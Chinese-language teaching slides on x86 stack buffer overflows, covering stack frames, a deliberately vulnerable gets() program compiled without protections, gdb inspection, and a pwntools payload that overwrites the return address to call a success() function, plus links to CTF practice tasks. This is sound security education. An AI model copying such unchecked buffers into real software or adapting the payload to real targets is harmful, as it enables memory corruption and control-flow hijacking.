+<p>缓冲区溢出实际就是在大缓冲区中的数据向小缓冲区复制的过程中，由于没有注意小缓冲区的边界，将小缓冲区撑爆，<strong>从而冲掉了和小缓冲区相邻内存区域的其它数据引起的内存问题</strong>。</p>
+<p>成功利用缓冲区溢出漏洞可以修改内存中变量的值、劫持进程、执行恶意代码，最终获得主机的控制权。</p>
+<hr />
+<!--_class: lead gaia>
+-->
+<h2 id="x86">栈溢出原理介绍（X86)<a class="headerlink" href="#x86" title="Permanent link">&para;</a></h2>
+<hr />
+<p><strong>进程使用的内存按照功能大致可以分为4个部分</strong>
+<img alt="bg right w:1000" src="img/process.png" />
+- 代码区：存储被装入执行的二进制机器代码，处理器在这个区域取指并执行
+- 数据区：用于存储全局变量等
+- 堆区：进程可以在堆区动态申请一定大小的内存，并在用完之后归还给堆区（malloc)
+- 栈区：用于动态存储函数之间的调用关系，以确保被调用函数在返回时恢复到母函数中继续执行。函数调用时，系统栈会为此函数开辟新的栈帧，并把它压入栈中，函数返回时，系统栈释放对应的栈帧。</p>
+<hr />
+<p><strong>函数调用主要涉及的寄存器</strong>
+- <strong>esp</strong></p>
+<p>用于存储函数调用栈的栈顶指针。</p>
+<ul>
+<li><strong>ebp</strong></li>
+</ul>
+<p>存储当前函数状态的基地址，在函数运行过程中保持不变，用来索引确定函数参数和局部变量的位置。</p>
+<ul>
+<li><strong>eip</strong></li>
+</ul>
+<h2 id="_5">存储下一条指令地址/要执行指令的地址。<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p><strong>函数调用大致过程</strong></p>
+<p><img alt="bg right w:600 h:600" src="img/stack_1.png" />
+- 参数入栈：将参数从右往依次入栈。
+- 返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行。
+- 代码区跳转：处理器从当前代码区跳转到被调用函数的入口。
+- 栈帧调整
+  - 保存当前栈帧状态值（调用函数的EBP入栈）。
+  - 将当前栈帧切换到新栈帧（将ESP值装入EBP，更新栈帧底部），给栈帧分配新空间。</p>
+<hr />
+<!--_class: lead gaia>
+-->
+<h3 id="_6">函数调用详细过程讲解<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<hr />
+<h2 id="example_1">Example_1<a class="headerlink" href="#example_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="cp">#</span><span class="w"> </span><span class="cp">include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">B</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">arg_1</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">arg_2</span><span class="p">){</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">d</span><span class="p">;</span>
+<span class="w">  </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arg_1</span><span class="o">+</span><span class="n">arg_2</span><span class="p">;</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">d</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">A</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">arg_1</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">arg_2</span><span class="p">){</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="p">;</span>
+<span class="w">  </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">B</span><span class="p">(</span><span class="n">arg_1</span><span class="p">,</span><span class="n">arg_2</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="n">A</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<hr />
+<p>使用如下指令进行编译
+<div class="highlight"><pre><span></span><code><span class="c1"># -m32 生成32位程序</span>
+<span class="c1"># -fno-stack-protector 不开启堆栈溢出保护</span>
+<span class="c1"># -no-pie 关闭PIE，避免加载基址被打乱</span>
+gcc<span class="w"> </span>-m32<span class="w"> </span>-fno-stack-protector<span class="w"> </span>stack_test.c<span class="w"> </span>-o<span class="w"> </span>stack_example<span class="w"> </span>-no-pie
+</code></pre></div>
+使用gdb调试查看函数调用的过程</p>
+<hr />
+<h2 id="example_2">Example_2<a class="headerlink" href="#example_2" title="Permanent link">&para;</a></h2>
+<h2 id="include-stdioh-include-stringh-void-success-putsyou-have-already-controlled-it-void-vulnerable-char-s12-getss-return-int-mainint-argc-char-argv-vulnerable-return-0"><div class="highlight"><pre><span></span><code><span class="cp">#</span><span class="w"> </span><span class="cp">include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#</span><span class="w"> </span><span class="cp">include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">success</span><span class="p">(){</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;You Have already controlled it.&quot;</span><span class="p">);</span>
+<span class="p">}</span><span class="w"> </span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">vulnerable</span><span class="p">(){</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+<span class="w">  </span><span class="n">vulnerable</span><span class="p">();</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><a class="headerlink" href="#include-stdioh-include-stringh-void-success-putsyou-have-already-controlled-it-void-vulnerable-char-s12-getss-return-int-mainint-argc-char-argv-vulnerable-return-0" title="Permanent link">&para;</a></h2>
+<p>将上述代码使用如下指令进行编译
+<div class="highlight"><pre><span></span><code><span class="c1"># -m32 生成32位程序</span>
+<span class="c1"># -fno-stack-protector 不开启堆栈溢出保护</span>
+<span class="c1"># -no-pie 关闭PIE，避免加载基址被打乱</span>
+gcc<span class="w"> </span>-m32<span class="w"> </span>-fno-stack-protector<span class="w"> </span>stack_example.c<span class="w"> </span>-o<span class="w"> </span>stack_example<span class="w"> </span>-no-pie
+
+<span class="c1"># 输出</span>
+<span class="c1"># 可以看到，gets 本身是一个危险函数。gets不检查输入字符串的长度，以回车判断输入是否结束</span>
+stack_example.c:<span class="w"> </span>In<span class="w"> </span><span class="k">function</span><span class="w"> </span>‘vulnerable’:
+stack_example.c:9:5:<span class="w"> </span>warning:<span class="w"> </span>implicit<span class="w"> </span>declaration<span class="w"> </span>of<span class="w"> </span><span class="k">function</span><span class="w"> </span>‘gets’<span class="w"> </span><span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
+<span class="w">     </span>gets<span class="o">(</span>s<span class="o">)</span><span class="p">;</span>
+<span class="w">     </span>^
+/tmp/ccxZmB0S.o:<span class="w"> </span>In<span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="sb">`</span>vulnerable<span class="s1">&#39;:</span>
+<span class="s1">stack_example.c:(.text+0x27): warning: the `gets&#39;</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>is<span class="w"> </span>dangerous<span class="w"> </span>and<span class="w"> </span>should<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>used.
+</code></pre></div></p>
+<hr />
+<p>使用 gdb 进行调试，可以看到 vulnerable() 调用 gets() 函数的过程</p>
+<div class="highlight"><pre><span></span><code><span class="err">►</span><span class="w">  </span><span class="mh">0x8048454</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">&gt;</span><span class="w">       </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="w">                     </span><span class="c1">// 保存 main 函数的栈帧</span>
+<span class="w">   </span><span class="mh">0x8048455</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="w">     </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="w"> </span><span class="n">esp</span><span class="w">                </span><span class="c1">// 更新栈帧底部</span>
+<span class="w">   </span><span class="mh">0x8048457</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;</span><span class="w">     </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18</span><span class="w">                  </span>
+<span class="w">   </span><span class="mh">0x804845a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span><span class="w">     </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc</span>
+<span class="w">   </span><span class="mh">0x804845d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span><span class="w">     </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x14</span><span class="p">]</span><span class="w">       </span>
+<span class="w">   </span><span class="mh">0x8048460</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span><span class="w">                     </span><span class="c1">// 局部变量入栈</span>
+<span class="w">   </span><span class="mh">0x8048461</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="w"> </span><span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span><span class="w">     </span><span class="c1">//  调用函数gets </span>
+
+<span class="w">   </span><span class="mh">0x8048466</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;</span><span class="w">    </span><span class="n">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span>
+<span class="w">   </span><span class="mh">0x8048469</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span><span class="w">    </span><span class="n">nop</span>
+<span class="w">   </span><span class="mh">0x804846a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span><span class="w">    </span><span class="n">leave</span>
+<span class="w">   </span><span class="mh">0x804846b</span><span class="w"> </span><span class="o">&lt;</span><span class="n">vulnerable</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;</span><span class="w">    </span><span class="n">ret</span>
+
+<span class="err">─</span>
+<span class="c1">// 进入call指令之后栈的变化</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">frame</span>
+<span class="n">Stack</span><span class="w"> </span><span class="n">level</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4d0</span><span class="o">:</span>
+<span class="n">eip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf7e61404</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">_IO_gets</span><span class="w"> </span><span class="p">(</span><span class="n">iogets</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">32</span><span class="p">);</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="n">eip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x8048466</span>
+<span class="n">called</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">frame</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd500</span>
+<span class="n">source</span><span class="w"> </span><span class="n">language</span><span class="w"> </span><span class="n">c</span><span class="p">.</span>
+<span class="n">Arglist</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4c8</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="o">:</span><span class="w"> </span><span class="n">buf</span><span class="o">=</span><span class="mh">0xffffd4e4</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+<span class="n">Locals</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4c8</span><span class="p">,</span><span class="w"> </span><span class="n">Previous</span><span class="w"> </span><span class="n">frame</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">sp</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="mh">0xffffd4d0</span>
+<span class="n">Saved</span><span class="w"> </span><span class="n">registers</span><span class="o">:</span>
+<span class="n">ebx</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4bc</span><span class="p">,</span><span class="w"> </span><span class="n">ebp</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4c8</span><span class="p">,</span><span class="w"> </span><span class="n">esi</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4c0</span><span class="p">,</span><span class="w"> </span><span class="n">edi</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4c4</span><span class="p">,</span><span class="w"> </span><span class="n">eip</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0xffffd4cc</span>
+</code></pre></div>
+<hr />
+<p>结合之前介绍的函数调用栈的变化可以得出
+<div class="highlight"><pre><span></span><code><span class="w">             </span>+-----------------+
+<span class="w">             </span><span class="p">|</span><span class="w">     </span>retaddr<span class="w">     </span><span class="p">|</span>
+<span class="w">             </span>+-----------------+
+<span class="w">             </span><span class="p">|</span><span class="w">     </span>saved<span class="w"> </span>ebp<span class="w">   </span><span class="p">|</span>
+<span class="w">      </span>ebp---&gt;+-----------------+
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+<span class="w">             </span><span class="p">|</span><span class="w">                 </span><span class="p">|</span>
+s,ebp-0x14--&gt;+-----------------+
+</code></pre></div></p>
+<hr />
+<p>接下来，尝试覆盖 <code>retaddr</code> ,将其变成 <code>success()</code> 函数的地址，达到执行 <code>success()</code> 函数的目的
+使用 <code>b*success()</code> 下断点的方式看看<code>success()</code>函数的地址
+<div class="highlight"><pre><span></span><code><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">b</span><span class="o">*</span><span class="n">success</span>
+<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x804843b</span>
+</code></pre></div>
+得到 <code>success()</code> 函数的地址，如果我们输入为<code>0x14*'a'+'bbbb'+success_addr</code>，此时，存储的 ebp 应该是<code>bbbb</code>,而 <code>retaddr</code> 应该是 <code>0x804843b</code>。由于在终端输入的时候 \，x 等也算一个单独的字符。所以不能直接在终端输入，需要借助 <code>pwntools</code>。</p>
+<hr />
+<p><div class="highlight"><pre><span></span><code><span class="c1">##coding=utf8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">## 构造与程序交互的对象</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./stack_example&#39;</span><span class="p">)</span>
+<span class="n">success_addr</span> <span class="o">=</span> <span class="mh">0x0804843b</span>
+<span class="c1">## 构造payload</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">success_addr</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="c1"># 输出</span>
+<span class="n">cuc</span><span class="nd">@cuc</span><span class="o">-</span><span class="n">VirtualBox</span><span class="p">:</span><span class="o">~/</span><span class="n">ctf</span><span class="err">$</span> <span class="n">python2</span> <span class="n">stack_example</span><span class="o">.</span><span class="n">py</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Checking</span> <span class="k">for</span> <span class="n">new</span> <span class="n">versions</span> <span class="n">of</span> <span class="n">pwntools</span>
+    <span class="n">To</span> <span class="n">disable</span> <span class="n">this</span> <span class="n">functionality</span><span class="p">,</span> <span class="nb">set</span> <span class="n">the</span> <span class="n">contents</span> <span class="n">of</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">cuc</span><span class="o">/.</span><span class="n">cache</span><span class="o">/.</span><span class="n">pwntools</span><span class="o">-</span><span class="n">cache</span><span class="o">-</span><span class="mf">2.7</span><span class="o">/</span><span class="n">update</span> <span class="n">to</span> <span class="s1">&#39;never&#39;</span> <span class="p">(</span><span class="n">old</span> <span class="n">way</span><span class="p">)</span><span class="o">.</span>
+    <span class="n">Or</span> <span class="n">add</span> <span class="n">the</span> <span class="n">following</span> <span class="n">lines</span> <span class="n">to</span> <span class="o">~/.</span><span class="n">pwn</span><span class="o">.</span><span class="n">conf</span> <span class="p">(</span><span class="ow">or</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">pwn</span><span class="o">.</span><span class="n">conf</span> <span class="n">system</span><span class="o">-</span><span class="n">wide</span><span class="p">):</span>
+        <span class="p">[</span><span class="n">update</span><span class="p">]</span>
+        <span class="n">interval</span><span class="o">=</span><span class="n">never</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">A</span> <span class="n">newer</span> <span class="n">version</span> <span class="n">of</span> <span class="n">pwntools</span> <span class="ow">is</span> <span class="n">available</span> <span class="n">on</span> <span class="n">pypi</span> <span class="p">(</span><span class="mf">4.2.1</span> <span class="o">--&gt;</span> <span class="mf">4.2.2</span><span class="p">)</span><span class="o">.</span>
+    <span class="n">Update</span> <span class="k">with</span><span class="p">:</span> <span class="err">$</span> <span class="n">pip</span> <span class="n">install</span> <span class="o">-</span><span class="n">U</span> <span class="n">pwntools</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">local</span> <span class="n">process</span> <span class="s1">&#39;./stack_example&#39;</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">5656</span>
+<span class="p">;</span>\<span class="n">x84</span>\<span class="n">x04</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+<span class="n">You</span> <span class="n">Have</span> <span class="n">already</span> <span class="n">controlled</span> <span class="n">it</span><span class="o">.</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
+</code></pre></div>
+从输出可以看出，执行成功执行了<code>success()</code>。</p>
+<hr />
+<!--_class: lead gaia>
+-->
+<h2 id="_7">栈溢出利用方法<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<hr />
+<p>上面的例子实际上已经展现了栈溢出的几个重要的步骤
+- 寻找危险函数
+- 确定填充长度</p>
+<p>常见的危险函数有：
+- 输入：gets、scanf、vscanf
+- 输出：sprintf
+- 字符串相关：strcpy、strcat、bcopy</p>
+<p>确定填充长度一般借助IDA PRO、gdb等工具并根据具体的覆盖需求进行计算</p>
+<hr />
+<p>利用栈溢出的基本思想就是通过覆盖函数的返回地址劫持程序控制流，主要方法如下：
+- shellcode
+- Return2libc
+- ROP(Return Oriented Programming)
+- Hijack GOT</p>
+<hr />
+<h3 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h3>
+<p>修改返回地址，让其指向溢出数据的一段指令</p>
+<hr />
+<ul>
+<li>返回地址之前<code>padding1</code>应该多长?
+可以使用 gdb 调试并运用超长输入探测（若返回地址被无效数据覆盖，程序将终止并报错，这是可以从报错信息看到是哪个地址被覆盖，从而可以计算出大小</li>
+</ul>
+<p><img alt="bg left w:600" src="../img/sc_1.PNG" /></p>
+<hr />
+<h3 id="return2libc">Return2libc<a class="headerlink" href="#return2libc" title="Permanent link">&para;</a></h3>
+<p>修改返回地址，让其指向内存中已有的某个函数</p>
+<hr />
+<p>调用函数的地址可以使用IDA PRO、gdb等来查看（查看动态链接库libc获得相对地址而后使用libc基址+相对地址得）
+函数参数同样可以搜索字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
+<p><img alt="bg left w:600" src="../img/r2l_1.PNG" /></p>
+<hr />
+<h2 id="_8">栈溢出入门题<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<hr />
+<ul>
+<li><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5051&amp;page=1">XCTF when_did_you_born</a></li>
+<li><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5053&amp;page=1">XCTF level0</a>【注意使用file level0 查看文件信息】</li>
+<li><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1">XCTF hellopwn</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.1e8ae164.min.js"></script>
+      
+        <script src="../../../_static/js/extra.js?v=16"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
